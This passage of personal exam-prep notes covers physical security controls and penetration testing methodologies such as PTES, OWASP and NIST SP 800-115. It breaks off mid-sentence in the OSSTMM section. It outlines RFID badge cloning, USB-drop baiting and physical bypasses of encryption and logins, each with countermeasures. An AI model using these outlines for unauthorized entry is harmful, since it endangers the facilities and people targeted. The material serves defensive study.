# Session 19 — Physical Security · Penetration Testing Methodologies 🔒

> Personal study notes | Ethical Hacking Module | CCEE Prep

---

## 📑 Table of Contents

- [🗺️ Where This Session Fits](#️-where-this-session-fits)
- [⚠️ Exam Traps & Misconceptions](#️-exam-traps--misconceptions)
- [🧱 Foundation Knowledge](#-foundation-knowledge)
- [Section 1 — Physical Security Overview](#section-1--physical-security-overview)
  - [1.1 What Is Physical Security](#11-what-is-physical-security)
  - [1.2 Why Physical Security Matters](#12-why-physical-security-matters)
  - [1.3 Physical Security and the CIA Triad](#13-physical-security-and-the-cia-triad)
  - [1.4 Defense-in-Depth Physical Model](#14-defense-in-depth-physical-model)
- [Section 2 — Need for Physical Security](#section-2--need-for-physical-security)
  - [2.1 Threats That Physical Security Addresses](#21-threats-that-physical-security-addresses)
  - [2.2 Consequences of Physical Security Failure](#22-consequences-of-physical-security-failure)
  - [2.3 Physical Security vs Cybersecurity Relationship](#23-physical-security-vs-cybersecurity-relationship)
- [Section 3 — Factors Affecting Physical Security](#section-3--factors-affecting-physical-security)
  - [3.1 Physical Barriers](#31-physical-barriers)
  - [3.2 Access Control Systems](#32-access-control-systems)
  - [3.3 Surveillance and Monitoring](#33-surveillance-and-monitoring)
  - [3.4 Security Personnel](#34-security-personnel)
  - [3.5 Environmental Controls](#35-environmental-controls)
  - [3.6 Lighting](#36-lighting)
  - [3.7 Locks and Safes](#37-locks-and-safes)
  - [3.8 Social Engineering Physical Attacks](#38-social-engineering-physical-attacks)
- [Section 4 — Penetration Testing Methodologies](#section-4--penetration-testing-methodologies)
  - [4.1 What Is Penetration Testing](#41-what-is-penetration-testing)
  - [4.2 Types of Penetration Tests](#42-types-of-penetration-tests)
  - [4.3 PTES — Penetration Testing Execution Standard](#43-ptes--penetration-testing-execution-standard)
  - [4.4 OWASP Testing Guide](#44-owasp-testing-guide)
  - [4.5 NIST SP 800-115](#45-nist-sp-800-115)
  - [4.6 OSSTMM](#46-osstmm)
  - [4.7 CEH Methodology](#47-ceh-methodology)
  - [4.8 Penetration Testing Phases — Unified View](#48-penetration-testing-phases--unified-view)
  - [4.9 Rules of Engagement](#49-rules-of-engagement)
  - [4.10 Penetration Test Deliverables](#410-penetration-test-deliverables)
- [Section 5 — Metasploit Framework](#section-5--metasploit-framework)
  - [5.1 Metasploit Overview](#51-metasploit-overview)
  - [5.2 Metasploit Architecture](#52-metasploit-architecture)
  - [5.3 Core Metasploit Commands](#53-core-metasploit-commands)
  - [5.4 Metasploit in Penetration Testing Phases](#54-metasploit-in-penetration-testing-phases)
- [📌 Extra Notes](#-extra-notes)
  - [E1 — Physical Penetration Testing](#e1--physical-penetration-testing)
  - [E2 — Lock Picking and Physical Bypass](#e2--lock-picking-and-physical-bypass)
  - [E3 — Red Team vs Blue Team vs Purple Team](#e3--red-team-vs-blue-team-vs-purple-team)
  - [E4 — CVSSv3 Scoring — Vulnerability Prioritization](#e4--cvssv3-scoring--vulnerability-prioritization)
  - [E5 — Penetration Testing vs Vulnerability Assessment](#e5--penetration-testing-vs-vulnerability-assessment)
  - [E6 — Famous Physical Security Breaches](#e6--famous-physical-security-breaches)
  - [E7 — Predecessor / Successor Chains](#e7--predecessor--successor-chains)
  - [E8 — Terminology Traps](#e8--terminology-traps)
  - [E9 — Current Landscape 2026](#e9--current-landscape-2026)
  - [E10 — Indian Legal Context](#e10--indian-legal-context)
- [Abbreviations Table](#abbreviations-table)
- [🔑 Keywords + Concept Map](#-keywords--concept-map)
- [⚡ Quick Reference Cheatsheet](#-quick-reference-cheatsheet)
- [✅ Session Revision Snapshot](#-session-revision-snapshot)
- [Next Session Bridge](#next-session-bridge)
- [📖 Glossary](#-glossary)

---

## 🗺️ Where This Session Fits

    Module 05 — Security Concepts
    └── Part B — Ethical Hacking (Sessions 6–20)
        ├── Sessions 6–9    : Concepts, Principles, Hacker Classes
        ├── Sessions 10–11  : Recon, Scanning, Enumeration, Passwords
        ├── Session 12A     : Password Countermeasures · Keyloggers
        ├── Session 12B     : Trojans · Backdoors · Reverse Shells
        ├── Session 13      : Trojan Construction · Wrapping · Evasion
        ├── Session 14      : Viruses · Worms · AV Evasion
        ├── Session 15      : Sniffing · ARP Poisoning · DNS Attacks
        ├── Session 16A     : DoS · DDoS · BOTs/BOTNETs · Smurf · SYN Flood
        ├── Session 16B     : Spoofing vs Hijacking · Session Hijacking
        ├── Session 17A     : Web Server Hacking · Web App Vulnerabilities
        ├── Session 17B     : Wireless Hacking · WEP/WPA · Wireless Attacks
        ├── Session 18      : Backdoors · DDoS Advanced · Biometrics · Linux
        │                     IDS · Honeypots · Firewalls
        ├── ▶ SESSION 19    : Physical Security · Need · Factors
        │                     Penetration Testing Methodologies · Metasploit
        │                                          ← YOU ARE HERE
        └── Session 20      : Malware Types · Malware Analysis · RE

**Phase position:** Session 19 connects two critical areas:
Physical security establishes the foundation that ALL digital
security controls depend upon — a compromised physical layer
bypasses every software control studied in Sessions 6–18.
Penetration Testing Methodologies ties the entire module together —
showing how all the attack techniques from reconnaissance through
exploitation fit into a structured, professional, authorized
engagement framework.

This is the penultimate session before the final Session 20
(Malware Analysis). After Session 19, the module transitions
to pure defensive analysis — understanding malware to build
better defences.

---

## ⚠️ Exam Traps & Misconceptions

| ❌ Misconception | ✅ Reality |
|---|---|
| Physical security is separate from cybersecurity | Physical security is the FOUNDATION of cybersecurity. Physical access to hardware bypasses all software controls — encryption, firewalls, AV — instantly. All digital security controls assume physical security as a prerequisite. |
| Piggybacking and tailgating are the same attack | TAILGATING: attacker follows an authorized person through a secure door without their knowledge. PIGGYBACKING: attacker follows WITH the knowledge and (coerced or willing) cooperation of the authorized person. Different social dynamics — same technical outcome. |
| A penetration test and a vulnerability assessment are the same | Vulnerability assessment IDENTIFIES and REPORTS vulnerabilities. Penetration testing EXPLOITS vulnerabilities to demonstrate real-world impact. VA stops at finding — PT goes all the way to proving exploitability and business impact. |
| Black box, white box, and grey box refer to test scopes | They refer to the INFORMATION provided to the tester before the engagement — not the scope. Black box = no prior knowledge. White box = full knowledge. Grey box = partial knowledge. Scope is a separate parameter. |
| Penetration testing requires no written authorization | Written authorization (Rules of Engagement / Letter of Authorization) is MANDATORY. Testing without explicit written authorization is a criminal offence regardless of intent — same as unauthorized hacking under IT Act S.66. |
| PTES is the only penetration testing methodology | Multiple methodologies exist: PTES, OWASP Testing Guide, NIST SP 800-115, OSSTMM, ISSAF, CEH methodology. Exams may reference any of them — know all names and their primary focus areas. |
| The reconnaissance phase of a pentest is passive only | Reconnaissance in penetration testing includes BOTH passive (OSINT, DNS lookup) AND active (port scanning, service enumeration) reconnaissance. Active recon requires authorization because it involves direct interaction with target systems. |
| Metasploit is only for exploitation | Metasploit covers the entire post-discovery workflow: auxiliary modules for scanning/enumeration, exploit modules for gaining access, post modules for privilege escalation and lateral movement, and payload modules for maintaining access. |
| A CCTV camera deters all physical attackers | CCTV is a DETECTIVE control — it records and deters opportunistic attackers. Determined adversaries wear disguises, disable cameras, or exploit camera blind spots. CCTV must be combined with preventive (barriers, locks) and responsive (security guards, alarms) controls. |
| Lock picking is a niche skill irrelevant to security | Physical penetration testers routinely pick locks as part of authorized physical security assessments. Most standard pin-tumbler locks can be picked in under 2 minutes by a trained tester — demonstrating that locked doors are not sufficient barriers without additional controls. |

---

## 🧱 Foundation Knowledge

<details>
<summary>Click to expand — Must-know before this session</summary>

**Security Control Types**

| Control Type | Purpose | Physical Example | Digital Example |
|---|---|---|---|
| **Preventive** | Stop incident from occurring | Fences, locks, bollards | Firewall, AV, access control |
| **Detective** | Identify incidents in progress or after | CCTV, motion sensors, audit logs | IDS, SIEM, log monitoring |
| **Deterrent** | Discourage attackers from attempting | Warning signs, visible cameras | Login banners, legal notices |
| **Corrective** | Restore after incident | Spare hardware, backup systems | Backup restore, patch deployment |
| **Compensating** | Alternative to unavailable primary control | Extra guard when door lock fails | MFA when password policy cannot be enforced |
| **Recovery** | Restore normal operations | DR site, UPS | Disaster recovery plan |

**The Physical Security Principle**
Physical access = game over for most security controls:
- Encrypt a laptop → attacker takes the laptop → cold boot attack
- Firewall protects a server → attacker plugs in USB → direct access
- Strong password on Windows → attacker boots from USB → bypasses login
- AV protects system → attacker installs hardware keylogger → captures everything

**CIA Triad and Physical Security**
- **Confidentiality**: Physical access allows reading screens, stealing hardware, planting keyloggers
- **Integrity**: Physical access allows modifying hardware, firmware implants, data tampering
- **Availability**: Physical access allows destroying hardware, cutting power, DoS via physical means

**MITRE ATT&CK Reference**
- TA0001 — Initial Access (physical: T1200 Hardware Additions)
- T1200 — Hardware Additions (hardware implants, rogue network devices)
- T1052 — Exfiltration Over Physical Medium (USB, HDD theft)
- T1491 — Defacement (physical: graffiti on building = same impact as website defacement)
- T1561 — Disk Wipe (physical: magnet on hard drive)

</details>

---

## Section 1 — Physical Security Overview

### 1.1 What Is Physical Security

**WHAT:**
Physical security encompasses all **measures, controls, and
processes** designed to prevent unauthorized physical access
to organizational assets — including facilities, hardware,
personnel, and sensitive information — while ensuring the
safety of authorized personnel and continuity of operations.

**Scope of physical security:**

    Physical Security
    ├── Facility protection    → Buildings, data centers, offices
    ├── Hardware protection   → Servers, workstations, network devices
    ├── Personnel safety      → Employee protection, evacuation procedures
    ├── Media protection      → Paper documents, USB drives, backup tapes
    ├── Environmental         → Fire, flood, temperature, power
    └── Perimeter control     → Fences, gates, reception, access control

**Analogy:**
Physical security is the outer castle wall. No matter how strong
the inner citadel (software security) is, if the outer wall falls,
the attackers are already inside. Every digital security control
assumes the physical layer is secure — without it, all other
controls become meaningless.

---

### 1.2 Why Physical Security Matters

**The physical access bypass principle:**
Physical access to any system effectively grants complete control
over that system — bypassing all software-level security controls:

| Software Control | Physical Bypass |
|---|---|
| Full disk encryption (BitLocker) | Cold boot attack — RAM contents persist briefly after power off — extract encryption key from RAM |
| Strong Windows/Linux password | Boot from USB → mount filesystem → access all files |
| Network firewall | Plug directly into internal switch port — bypass perimeter |
| Antivirus software | Install hardware keylogger between keyboard and computer |
| Two-factor authentication | Steal enrolled device + know PIN (observe over shoulder) |
| Encrypted HTTPS communications | Install network tap between wall jack and computer |
| BIOS password | Remove CMOS battery or use motherboard jumper — reset BIOS |

**Security principle:**
> "Security is only as strong as its weakest link — and for most
> organizations, the weakest link is the physical layer."

---

### 1.3 Physical Security and the CIA Triad

| CIA Pillar | Physical Threat | Example |
|---|---|---|
| **Confidentiality** | Shoulder surfing, document theft, screen capture | Attacker reads CEO's screen in airport lounge |
| **Confidentiality** | Hardware theft | Laptop with unencrypted PII stolen from car |
| **Confidentiality** | Dumpster diving | Discarded printouts contain account numbers |
| **Integrity** | Hardware tampering | Attacker replaces keyboard with keystroke logger |
| **Integrity** | Firmware implant | Supply chain — backdoor implanted before delivery |
| **Integrity** | Data manipulation | Attacker boots from USB → modifies database files |
| **Availability** | Hardware destruction | Disgruntled employee destroys server room |
| **Availability** | Power disruption | Attacker cuts power or triggers UPS failure |
| **Availability** | Environmental hazard | Flooding in data center — servers destroyed |

---

### 1.4 Defense-in-Depth Physical Model

Physical security uses concentric layers — each adding another
barrier between the attacker and the target asset:

    LAYER 1 — Perimeter
    Fences, walls, bollards, gates, landscaping
    → First barrier — keeps casual intruders out

    LAYER 2 — Building Exterior
    Reinforced doors, access-controlled entry points,
    security reception, visitor management
    → Requires identification/authorization to enter building

    LAYER 3 — Internal Zones
    Segmented access — card readers between departments,
    mantrap/airlock, security escorting visitors
    → Limits movement within building by access level

    LAYER 4 — Secure Areas
    Data center, server rooms, executive offices
    → High-security zones — biometric + card + PIN
    → Audit logs of every entry/exit

    LAYER 5 — Asset Level
    Cable locks for laptops, server cage locks,
    encrypted storage, hardware tamper seals
    → Final protection at the asset itself

> [!IMPORTANT]
> Each layer must function independently — compromise of one layer
> should not automatically compromise all inner layers.
> An attacker who bypasses the perimeter fence should still be
> stopped by the building access control system.

---

## Section 2 — Need for Physical Security

### 2.1 Threats That Physical Security Addresses

| Threat Category | Specific Threat | Vector |
|---|---|---|
| **Unauthorized access** | Tailgating, piggybacking, lock picking | Social engineering, technical |
| **Theft** | Laptop theft, USB drive theft, server theft | Opportunistic, insider |
| **Sabotage** | Hardware destruction, cable cutting, power disruption | Insider, competitor |
| **Espionage** | Shoulder surfing, document photography, eavesdropping | Competitor, nation-state |
| **Environmental** | Fire, flood, earthquake, lightning, temperature extremes | Natural, accidental |
| **Social engineering** | Impersonation, pretexting, baiting | Human manipulation |
| **Supply chain** | Hardware implants during manufacturing/shipping | Nation-state, organized crime |
| **Dumpster diving** | Recovering discarded documents, hardware, media | Low-skill, high-reward |
| **Wireless interception** | Planting rogue AP inside facility | Technical |
| **Insider threat** | Authorized personnel abusing physical access | Malicious insider |

---

### 2.2 Consequences of Physical Security Failure

| Consequence | Impact | Real-World Example |
|---|---|---|
| **Data breach** | PII/IP exposure → regulatory fines, litigation | Laptop stolen from car → HIPAA breach notification |
| **Business disruption** | Operations halted → revenue loss | Server room flood → 48-hour outage |
| **Regulatory violation** | DPDPA, HIPAA, PCI-DSS penalties | Unshredded patient records in trash → fine |
| **Reputational damage** | Customer trust loss → churn | CCTV footage of security breach leaked |
| **Physical harm** | Personnel injury, kidnapping | Inadequate security allows violent intruder |
| **IP theft** | Competitive advantage lost | Competitor copies R&D documents |
| **Supply chain compromise** | Backdoored hardware in production | Hardware implant survives all software remediation |

---

### 2.3 Physical Security vs Cybersecurity Relationship

Physical and cybersecurity are not separate domains — they are
interdependent layers of the same security posture:

    Physical security failures that ENABLE cyber attacks:
    → Attacker enters server room → installs hardware keylogger
    → Attacker plants rogue Wi-Fi AP in ceiling
    → Attacker steals backup tape → reads all data offline
    → Insider plugs in USB with malware → network compromise

    Cyber attacks that REQUIRE physical security response:
    → Ransomware destroys servers → physical DR site needed
    → Power grid attack → physical UPS/generator response
    → Hardware implant via remote firmware attack → physical inspection

> [!NOTE]
> A well-documented real-world attack pattern: attackers combine
> physical and cyber techniques in sequence. Physical access to
> plant a device (rogue AP, hardware keylogger) provides the
> initial foothold → cyber techniques complete the compromise.
> Treating physical and cyber security as separate programs
> creates gaps that sophisticated attackers exploit.

---

## Section 3 — Factors Affecting Physical Security

### 3.1 Physical Barriers

**WHAT:**
Physical barriers are the foundational layer of physical security —
they create physical obstacles that prevent or delay unauthorized
access to protected areas.

| Barrier Type | Description | Protection Level |
|---|---|---|
| **Perimeter fencing** | Chain-link, steel palisade, concrete walls | Delays intruder — not impenetrable |
| **Bollards** | Concrete/steel posts — prevent vehicle ramming | High — vehicle-borne attack prevention |
| **Security walls** | Reinforced concrete — blast and forced-entry resistant | High — data center perimeters |
| **Turnstiles** | One-person-at-a-time entry — prevents tailgating | Medium — defeats casual tailgating |
| **Mantraps / Airlocks** | Two-door airlock — second door only opens after first closes | High — defeats tailgating entirely |
| **Reinforced doors** | Steel-core doors — resist forced entry | High — with proper frame and hinges |
| **Window security** | Laminated glass, security film, bars | Medium — delays smash-and-grab |
| **Cable locks** | Laptop/equipment tethering | Low — delays opportunistic theft |
| **Server cages/racks** | Locked server rack enclosures | Medium — within-facility protection |

**Mantrap (Airlock) mechanism:**

    Entry sequence:
    Person enters first door (swipes card / presents biometric)
    First door closes and locks
    Person stands in small chamber (mantrap)
    System verifies: only one person in chamber? Weight sensor? Video check?
    If approved: second door opens → access granted
    If unauthorized: both doors remain locked → security alerted

> [!IMPORTANT]
> A mantrap defeats **tailgating** — the most common physical
> access control bypass. Without a mantrap, an attacker can
> follow an authorized person through a card-reader door before
> it closes. A mantrap ensures one person at a time — making
> tailgating physically impossible.

---

### 3.2 Access Control Systems

| System Type | How It Works | Security Level |
|---|---|---|
| **Physical key locks** | Traditional key tumbler — pin-tumbler mechanism | Low — keys copied, locks picked |
| **Combination locks** | PIN pad — no physical key needed | Low-Medium — shoulder surfing, brute force |
| **Magnetic stripe cards** | Swipe card — encoded magnetic strip | Low — easily cloned with card reader |
| **Proximity cards (RFID)** | Contactless — radio frequency ID | Medium — cloneable with RFID reader |
| **Smart cards** | Chip-based — cryptographic authentication | High — harder to clone |
| **Biometric** | Fingerprint, retina, iris, face, vein | High — see Session 18 |
| **Multi-factor (card + PIN)** | Something you have + something you know | High |
| **Multi-factor (card + biometric)** | Something you have + something you are | Very High |

**RFID cloning attack:**

    Attacker carries hidden RFID reader (range 10–50cm)
    Attacker stands near victim in elevator/queue
    Reader captures proximity card signal wirelessly
    Attacker writes captured signal to blank card
    Attacker presents cloned card → access granted

    Countermeasure: RFID-blocking card sleeve/wallet
    Better: switch to cryptographic smart cards (cannot be cloned)

**Access control principles:**

| Principle | Application |
|---|---|
| **Least privilege** | Employees only access areas needed for their role |
| **Need to know** | Data center access limited to IT operations staff |
| **Separation of duties** | No single person controls both access and audit |
| **Dual control** | Two-person authorization for highest-security areas |
| **Time-based restrictions** | Card access only during business hours |
| **Visitor management** | Escort policy — visitors never unaccompanied |

---

### 3.3 Surveillance and Monitoring

**CCTV (Closed-Circuit Television):**

| Property | Detail |
|---|---|
| **Control type** | Detective (records) + Deterrent (visible cameras discourage) |
| **Coverage** | All entry/exit points, server rooms, perimeter, reception |
| **Retention** | Minimum 30–90 days for most regulations |
| **Resolution** | HD (1080p+) for face recognition — 4K for license plates |
| **Analytics** | Motion detection, facial recognition, license plate recognition |
| **Blind spots** | Every camera has blind spots — coverage maps required |
| **Countermeasures** | Disguise, camera disabling, blind spot exploitation |

**CCTV placement priorities:**

    Priority 1: Entry/exit points (doors, windows, gates)
    Priority 2: Server rooms, data centers, secure storage
    Priority 3: Reception areas, visitor waiting areas
    Priority 4: Parking lots, loading docks
    Priority 5: Internal corridors between secure zones

**Motion sensors:**
- **Passive Infrared (PIR)**: detects body heat movement — common in offices
- **Microwave**: detects movement via reflected microwave signals
- **Ultrasonic**: detects movement via reflected sound waves
- **Dual-technology**: combines PIR + microwave — fewer false alarms

**Intrusion Detection Systems (Physical):**
- Door/window contact sensors — alert on unauthorized opening
- Glass break detectors — acoustic sensor detects glass breaking frequency
- Vibration sensors — detect drilling, cutting, forced entry
- Pressure mats — detect footsteps in restricted areas

---

### 3.4 Security Personnel

| Role | Function | Limitation |
|---|---|---|
| **Security guards** | Patrol, check credentials, respond to incidents | Human factors — fatigue, bribery, social engineering |
| **Reception/front desk** | Visitor management, package inspection | Social engineering target — impersonation attacks |
| **Security operations center** | Monitor CCTV, alarms, access control systems | Alert fatigue — too many low-priority alerts |
| **Incident response team** | Respond to physical security incidents | Response time — attacker may complete in minutes |

**Social engineering against security personnel:**

| Attack | Description |
|---|---|
| **Impersonation** | Attacker poses as IT support, delivery person, executive, contractor |
| **Pretexting** | Elaborate backstory — "I forgot my access card — just need 5 minutes" |
| **Authority exploitation** | "I'm from corporate security auditing — let me in immediately" |
| **Urgency/distraction** | Create distraction → accomplice slips through |
| **Tailgating** | Follow authorized person through secure door |
| **Piggybacking** | Talk to authorized person → they hold door as courtesy |

> [!WARNING]
> Security guard training is as important as physical barrier
> installation. An attacker who can socially engineer a guard
> bypasses all technical access controls. Security awareness
> training, clear verification procedures, and a culture of
> "when in doubt, verify and escalate" are essential.

---

### 3.5 Environmental Controls

**WHAT:**
Environmental controls protect physical assets from natural and
accidental threats — heat, humidity, power failure, fire, and
flooding — that can destroy hardware causing availability failures.

**Data center environmental standards:**

| Parameter | Target Range | Threat if Violated |
|---|---|---|
| **Temperature** | 18–27°C (ASHRAE A1 class) | Overheating → hardware failure |
| **Humidity** | 40–60% RH | Too dry → ESD; Too humid → condensation |
| **Power** | Clean, stable, redundant | Fluctuation → data corruption; outage → downtime |
| **Air quality** | Filtered, positive pressure | Dust → overheating; chemical → corrosion |

**Fire suppression:**

| System | How It Works | Data Center Suitability |
|---|---|---|
| **Water sprinklers** | Spray water → extinguish fire | ❌ Destroys hardware — not suitable for server rooms |
| **Halon (banned)** | Depletes oxygen → suppresses fire | ❌ Ozone-depleting — banned since 1994 |
| **FM-200 (HFC-227ea)** | Chemical — safe for electronics | ✅ Industry standard — no hardware damage |
| **Novec 1230** | Fluoroketone — safe for electronics | ✅ Environmentally preferred alternative |
| **CO2 suppression** | Carbon dioxide — displaces oxygen | ⚠️ Lethal to humans — requires evacuation |
| **Inert gas (IG-541)** | Argon/nitrogen mix — oxygen reduction | ✅ Safe — no residue |

**Power protection:**

    Power threat layers and responses:

    Power surge → Surge protector / UPS with surge protection
    Brief outage (<30 min) → UPS (Uninterruptible Power Supply)
    Extended outage → Generator (diesel/natural gas)
    Utility failure → Dual utility feeds from separate substations
    Complete grid failure → On-site generation + fuel reserves

**UPS types:**

| Type | How It Works | Protection |
|---|---|---|
| **Standby (offline)** | Battery only kicks in on failure | Basic — switches on outage |
| **Line-interactive** | Regulates voltage continuously | Better — handles fluctuations |
| **Online (double-conversion)** | Always on battery — utility charges battery | Best — zero transfer time |

---

### 3.6 Lighting

**Why lighting matters in physical security:**
- Adequate lighting deters opportunistic attackers (fear of being seen)
- Enables CCTV to capture usable footage (cameras need light)
- Allows security personnel to observe activity
- Creates psychological safety for employees after hours

**Lighting security standards:**

| Area | Minimum Illumination | Rationale |
|---|---|---|
| Perimeter / building exterior | 2–5 foot-candles | CCTV effectiveness, deterrence |
| Parking lots | 1–3 foot-candles | Personal safety, vehicle monitoring |
| Entry/exit points | 5–10 foot-candles | ID verification, CCTV |
| Secure areas (internal) | 30–50 foot-candles | Work environment + monitoring |

**Motion-activated lighting:**
Unexpected activation of motion-activated lights is itself a
detection mechanism — alerts occupants to movement in dark areas.

---

### 3.7 Locks and Safes

**Lock types and security levels:**

| Lock Type | Mechanism | Security Level | Attack Method |
|---|---|---|---|
| **Pin tumbler** | Spring-loaded pins — key lifts pins to shear line | Low-Medium | Lock picking, bump key |
| **Wafer lock** | Flat wafers instead of pins — cheaper | Low | Easier to pick than pin tumbler |
| **Disc detainer** | Rotating discs — high-security pin tumbler variant | High | Requires specialized pick tools |
| **Tubular lock** | Circular keyway — vending machines, bike locks | Low | Tubular lock pick tool |
| **Deadbolt** | Bolt extends into door frame — no spring | Medium | Pick lock, drill, kick door |
| **Electronic keypad** | PIN code — programmable | Medium | Shoulder surfing, brute force, bypass |
| **Magnetic card reader** | Swipe/tap card | Medium | Card cloning, tailgating |
| **Smart lock** | Wireless + certificate-based | High | Side-channel, implementation bugs |
| **High-security locks** | Medeco, Mul-T-Lock — pick resistant | High | Specialized tools, destructive entry |

**Safes and secure storage:**

| Safe Type | Protection | Appropriate Use |
|---|---|---|
| **Fireproof safe** | Protects contents from fire (UL rating) | Documents, backup media |
| **Burglar safe** | Resists forced entry (TL/TR/TRTL ratings) | Cash, jewelry, high-value items |
| **Combination safe** | Combination lock — no key to copy | General secure storage |
| **Biometric safe** | Fingerprint access | Quick access with high security |
| **Server-grade security cage** | Bolted to floor/wall — locked rack | Server room hardware |

---

### 3.8 Social Engineering Physical Attacks

| Attack | Description | Countermeasure |
|---|---|---|
| **Tailgating** | Follow authorized person through secure door undetected | Mantrap, turnstile, security awareness |
| **Piggybacking** | Follow with knowledge/assistance of authorized person | Security culture — never hold doors |
| **Impersonation** | Pose as IT, delivery, executive, auditor | Strict visitor policy, verify all IDs |
| **Dumpster diving** | Search discarded documents, hardware, media | Shredding policy, secure disposal |
| **Shoulder surfing** | Observe screen/keyboard from proximity | Privacy screens, positioning awareness |
| **Baiting** | Leave infected USB drives in parking lot | Security awareness training |
| **Vishing (physical)** | Call claiming to need physical access urgently | Verify caller identity — call back on known number |
| **Pretexting** | Elaborate false scenario to justify access | Strict verification regardless of story |

**Baiting attack — USB drop:**

    Attacker labels USB drives "SALARY_2024_CONFIDENTIAL.xlsx"
    Drops them in parking lot, bathrooms, reception desk
    Curious employee plugs in → malware executes
    → Network compromise from physical bait

    Countermeasure:
    - Disable USB autorun (GPO)
    - DLP preventing USB execution
    - Security awareness: report found USB drives — never plug in

---

## Section 4 — Penetration Testing Methodologies

### 4.1 What Is Penetration Testing

**WHAT:**
Penetration testing (pentest) is a **simulated cyber attack** against
a computer system, network, or application — performed by authorized
security professionals (ethical hackers) to identify vulnerabilities
that a real attacker could exploit — and to demonstrate the actual
business impact of those vulnerabilities.

**WHY organizations do pentests:**
- Validate that security controls work as intended
- Identify vulnerabilities before real attackers do
- Meet compliance requirements (PCI-DSS, ISO 27001, HIPAA)
- Assess security posture after major changes (new application, cloud migration)
- Demonstrate security to customers and partners
- Train incident response teams (detect the pentest?)
- Prioritize security investment by exploitability

**Pentest vs Real Attack — Key Difference:**

| Property | Real Attacker | Penetration Tester |
|---|---|---|
| Authorization | ❌ None | ✅ Written authorization required |
| Scope | No limits | Defined scope — stay within boundaries |
| Goal | Maximum damage/profit | Identify and document vulnerabilities |
| Destructive actions | ✅ Destroys data, systems | ❌ Non-destructive testing |
| Reporting | No report | Detailed report to client |
| Legal | Illegal | Legal — authorized activity |

---

### 4.2 Types of Penetration Tests

**By Information Provided:**

| Type | Info Given | Simulates | Use Case |
|---|---|---|---|
| **Black Box** | Zero — only target name/IP | External attacker with no insider info | External threat simulation |
| **White Box** | Full — source code, architecture, credentials | Insider threat, security audit | Thorough code/architecture review |
| **Grey Box** | Partial — some credentials, limited arch info | Attacker with limited insider knowledge | Most common — realistic + efficient |

**By Target:**

| Type | Target | Typical Scope |
|---|---|---|
| **Network pentest** | Internal/external network infrastructure | Firewall, routers, switches, servers |
| **Web application pentest** | Web applications and APIs | OWASP Top 10, authentication, authorization |
| **Mobile application pentest** | iOS/Android apps | Client-side storage, API security, certificate pinning |
| **Wireless pentest** | Wi-Fi networks | WPA2 cracking, rogue AP, evil twin |
| **Social engineering pentest** | Human element | Phishing, vishing, pretexting |
| **Physical pentest** | Facility physical controls | Lock picking, tailgating, badge cloning |
| **Red team assessment** | Full-scope — multiple vectors | Comprehensive threat simulation |
| **Cloud pentest** | AWS/Azure/GCP environments | IAM, storage exposure, serverless |

**By Engagement Type:**

| Type | Description |
|---|---|
| **External pentest** | Attacker perspective from internet — no internal access |
| **Internal pentest** | Attacker perspective from inside network — simulates insider/post-breach |
| **Assumed breach** | Start with compromised endpoint — focus on post-exploitation |

---

### 4.3 PTES — Penetration Testing Execution Standard

**WHAT:**
PTES (Penetration Testing Execution Standard) is a comprehensive
methodology published by security professionals that defines a
standard framework for penetration testing engagements from
pre-engagement to reporting.

**PTES Seven Phases:**

    PHASE 1 — Pre-Engagement Interactions
      Define scope, objectives, rules of engagement
      Obtain written authorization (Letter of Authorization)
      Agree on testing window, emergency contacts, excluded systems
      Sign NDA — penetration test data is highly sensitive

    PHASE 2 — Intelligence Gathering (Reconnaissance)
      Passive: OSINT, DNS, WHOIS, social media, LinkedIn
      Active: Port scanning, service enumeration (authorized)
      Goal: Build complete picture of target attack surface
      Tools: Maltego, Shodan, theHarvester, Nmap

    PHASE 3 — Threat Modeling
      Identify assets of highest value to attacker
      Map attack paths from internet to crown jewels
      Prioritize testing effort based on risk
      Align with business impact — what would hurt most?

    PHASE 4 — Vulnerability Identification
      Automated scanning: Nessus, OpenVAS, Qualys
      Manual testing: Custom checks, protocol analysis
      Web: OWASP testing, Burp Suite, manual code review
      Output: List of vulnerabilities with evidence

    PHASE 5 — Exploitation
      Attempt to exploit identified vulnerabilities
      Prove exploitability — not just theoretical
      Metasploit, custom exploits, public PoC code
      Document: what worked, what didn't, conditions required

    PHASE 6 — Post-Exploitation
      Privilege escalation from gained access
      Lateral movement to other systems
      Data exfiltration — what could attacker reach?
      Persistence mechanisms — how long undetected?
      Impact demonstration — reach the crown jewel?

    PHASE 7 — Reporting
      Executive summary — non-technical business impact
      Technical findings — vulnerability details, evidence
      Risk rating — CVSS scores, business context
      Remediation recommendations — prioritized fixes
      Appendix — raw scan data, screenshots, exploit code

> [!IMPORTANT]
> PTES is the most comprehensive and widely referenced pentest
> methodology. Know all seven phases and their sequence.
> "Pre-engagement" is always first — no testing occurs without
> written authorization and defined scope.

---

### 4.4 OWASP Testing Guide

**WHAT:**
The OWASP Testing Guide (OTG) is a comprehensive methodology
specifically for **web application security testing** — published
by OWASP (Open Web Application Security Project).

**Current version:** OWASP Testing Guide v4.2 (2020)

**Key focus areas:**

| Category | Testing Focus |
|---|---|
| **OTG-INFO** | Information gathering — server version, technology stack, entry points |
| **OTG-CONF** | Configuration testing — HTTP methods, file extensions, transport security |
| **OTG-IDENT** | Identity management — user enumeration, account provisioning |
| **OTG-AUTHN** | Authentication testing — login bypass, credential transport, brute force |
| **OTG-AUTHZ** | Authorization testing — IDOR, privilege escalation, path traversal |
| **OTG-SESS** | Session management — cookie attributes, CSRF, session fixation |
| **OTG-INPV** | Input validation — SQLi, XSS, XXE, command injection |
| **OTG-ERRH** | Error handling — verbose errors, stack traces |
| **OTG-CRYPT** | Cryptography — weak algorithms, certificate issues |
| **OTG-BUSLOGIC** | Business logic — workflow bypass, pricing manipulation |
| **OTG-CLIENT** | Client-side testing — DOM XSS, HTML injection, clickjacking |

---

### 4.5 NIST SP 800-115

**WHAT:**
NIST Special Publication 800-115 "Technical Guide to Information
Security Testing and Assessment" provides a formal framework
for government and enterprise security testing.

**NIST SP 800-115 Phases:**

| Phase | Activities |
|---|---|
| **Planning** | Rules of engagement, legal authorization, threat model |
| **Discovery** | Reconnaissance + vulnerability scanning |
| **Attack** | Exploitation — verify and confirm vulnerabilities |
| **Reporting** | Document findings, recommend mitigations |

**NIST testing techniques:**

| Technique | Description |
|---|---|
| **Review techniques** | Documentation review, log analysis, ruleset review |
| **Target identification** | Network discovery, OS fingerprinting |
| **Target analysis** | Vulnerability scanning, password analysis |
| **Target vulnerability validation** | Exploit vulnerabilities — confirm impact |

---

### 4.6 OSSTMM

**WHAT:**
OSSTMM (Open Source Security Testing Methodology Manual) is a
comprehensive security testing methodology developed by ISECOM
(Institute for Security and Open Methodologies) — focused on
